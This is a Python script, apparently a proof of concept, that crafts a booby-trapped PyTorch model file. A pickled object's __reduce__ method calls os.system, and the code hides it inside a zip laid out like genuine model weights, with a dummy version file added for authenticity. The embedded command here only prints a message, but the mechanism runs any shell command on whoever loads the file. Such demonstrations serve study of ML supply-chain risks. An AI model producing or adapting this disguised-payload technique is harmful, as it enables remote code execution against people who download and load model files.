import pickle
import os
import zipfile
import io

# 1. Define the Malicious Payload
class MaliciousPayload(object):
    def __reduce__(self):
        # This is the "RCE" (Remote Code Execution) instruction
        # It tells the victim's machine to run a shell command
        return (os.system, ("echo ' [CRITICAL] MALWARE EXECUTED SUCCESSFULLY '",))

# 2. Serialize it (Pickle it)
# We use protocol 2 or higher, which is standard for ML
payload_bytes = pickle.dumps(MaliciousPayload())

# 3. Package it like a PyTorch model
# PyTorch models are just Zip files containing a file usually named 'archive/data.pkl'
zip_buffer = io.BytesIO()
with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as z:
    # We place the payload where PyTorch expects weights to be
    z.writestr('archive/data.pkl', payload_bytes)
    # Add a dummy version file to make it look authentic
    z.writestr('archive/version', '3')

# 4. Save to disk
# Get the directory where this script is located
script_dir = os.path.dirname(os.path.abspath(__file__))
output_file = os.path.join(script_dir, "malicious_model.pt")
with open(output_file, "wb") as f:
    f.write(zip_buffer.getvalue())

print(f"âœ… Generated {output_file} (Pure Python, No Torch needed)")